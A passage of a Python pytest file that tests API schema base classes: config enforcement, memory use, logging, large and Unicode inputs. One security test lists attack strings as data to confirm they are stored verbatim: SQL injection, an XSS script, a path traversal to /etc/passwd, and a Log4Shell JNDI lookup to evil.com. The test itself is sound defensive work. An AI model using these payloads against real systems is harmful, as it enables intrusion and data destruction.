    """Test enhanced entity patterns per adr-enhanced-entity-patterns.md."""

    @pytest.mark.unit
    def test_validation_config_enforcement(self):
        """Test that validation configuration is enforced and monitored."""
        entity = ApiTestEntity(id=str(uuid4()), name="Test", created_at=datetime.now(UTC), updated_at=datetime.now(UTC))  # type: ignore

        # The _enforce_validation_config should have run during initialization
        # Verify the configuration is correct
        config = entity.model_config
        assert config.get("strict") is True
        assert config.get("frozen") is True
        assert config.get("extra") == "forbid"
        assert config.get("validate_assignment") is True

    @pytest.mark.unit
    def test_instance_level_caching_support(self):
        """Test that the base model supports instance-level caching patterns."""
        # Test that the convert utility is available for caching operations
        entity = ApiTestEntity(id=str(uuid4()), name="Test", created_at=datetime.now(UTC), updated_at=datetime.now(UTC))  # type: ignore

        # Verify the conversion utility is accessible
        assert hasattr(entity.__class__, "convert")
        assert hasattr(entity.__class__.convert, "uuid_to_string")
        assert hasattr(entity.__class__.convert, "string_to_uuid")

    @pytest.mark.unit
    def test_aggregate_boundary_patterns(self):
        """Test support for aggregate boundary patterns with protected setters."""
        # Test that update_properties pattern would work with entities
        entity = ApiTestEntity(id=str(uuid4()), name="Test", created_at=datetime.now(UTC), updated_at=datetime.now(UTC))  # type: ignore

        # Test that the entity supports the enhanced entity base patterns
        assert hasattr(entity, "model_config")
        assert entity.model_config.get("frozen") is True  # Immutability support

        # Test field access patterns
        assert entity.id is not None
        assert entity.name == "Test"


# Performance monitoring and memory usage tests
class TestPerformanceMonitoring:
    """Test performance monitoring and memory usage validation."""

    @pytest.mark.performance
    def test_memory_usage_validation(self):
        """Test that memory usage doesn't increase significantly."""
        import os

        import psutil

        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss

        # Create many objects to test memory usage
        objects = []
        for i in range(1000):
            obj = ApiTestValueObject(value=f"test_{i}", number=i)
            objects.append(obj)

        final_memory = process.memory_info().rss
        memory_increase_mb = (final_memory - initial_memory) / (1024 * 1024)

        # Memory increase should be reasonable (less than 50MB for 1000 objects)
        assert (
            memory_increase_mb < 50
        ), f"Memory usage increased by {memory_increase_mb:.2f}MB, which is excessive"

    @pytest.mark.unit
    def test_validation_logging_functionality(self):
        """Test that validation logging works when enabled."""

        # Test schema names that trigger logging
        class ApiMealTest(BaseApiValueObject):
            name: str

            @classmethod
            def from_domain(cls, domain_obj):
                return cls(name=str(domain_obj))

            def to_domain(self):
                return self.name

            @classmethod
            def from_orm_model(cls, orm_model):
                return cls(name=str(orm_model))

            def to_orm_kwargs(self):
                return {"name": self.name}

        # Mock the logger module instead of the debug method directly
        with patch("src.logging.logger.structlog_logger") as mock_logger:
            obj = ApiMealTest(name="test")
            # Test passes if no exceptions are raised during object creation


# Security and edge case validation
class TestSecurityValidation:
    """Test security-related validation and edge cases."""

    @pytest.mark.security
    def test_injection_attack_prevention(self):
        """Test that the schema prevents basic injection attacks."""
        # SQL injection attempts should be treated as normal strings
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
        ]

        for malicious_input in malicious_inputs:
            # Should not raise security errors, but treat as normal string
            obj = ApiTestValueObject(value=malicious_input, number=42)
            assert obj.value == malicious_input  # Stored as-is, not processed

    @pytest.mark.unit
    def test_large_input_handling(self):
        """Test handling of very large inputs."""
        # Very large string
        large_string = "x" * 10000
        obj = ApiTestValueObject(value=large_string, number=42)
        assert len(obj.value) == 10000

        # Very large number
        large_number = 999999999999999999
        obj = ApiTestValueObject(value="test", number=large_number)
        assert obj.number == large_number

    @pytest.mark.unit
    def test_unicode_and_encoding_handling(self):
        """Test proper Unicode and encoding handling."""
        unicode_inputs = [
            "测试中文",
            "🚀🎉��",
            "Café résumé naïve",
            "العربية",
            "русский",
        ]

        for unicode_input in unicode_inputs:
            obj = ApiTestValueObject(value=unicode_input, number=42)
            assert obj.value == unicode_input

            # Test JSON serialization preserves Unicode
            json_data = obj.model_dump_json()
            deserialized = ApiTestValueObject.model_validate_json(json_data)
            assert deserialized.value == unicode_input
